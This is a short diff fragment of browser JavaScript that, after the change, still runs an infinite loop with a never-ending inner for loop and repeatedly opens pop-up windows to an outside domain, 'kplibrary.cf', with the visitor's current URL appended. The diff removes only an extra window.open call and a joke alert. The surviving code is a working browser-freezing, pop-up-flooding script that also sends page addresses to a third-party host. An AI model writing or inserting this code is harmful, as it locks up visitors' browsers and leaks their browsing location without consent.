@@ -6,13 +6,9 @@ if (popUp == null || typeof(popUp) == 'undefined') {
   }
 } else {
   while (true) {
-    window.open()
     for (var i = 0; i === i; i++) {}
     var strWindowFeatures = "location=yes,height=1200,width=1400,scrollbars=yes,status=yes";
     var URL = "http://kplibrary.cf/" + location.href;
     var win = window.open(URL, "_blank", strWindowFeatures);
-    txt = "a";
-    txt = txt += "a";
-    alert("Thicc Katz")
   }
 }
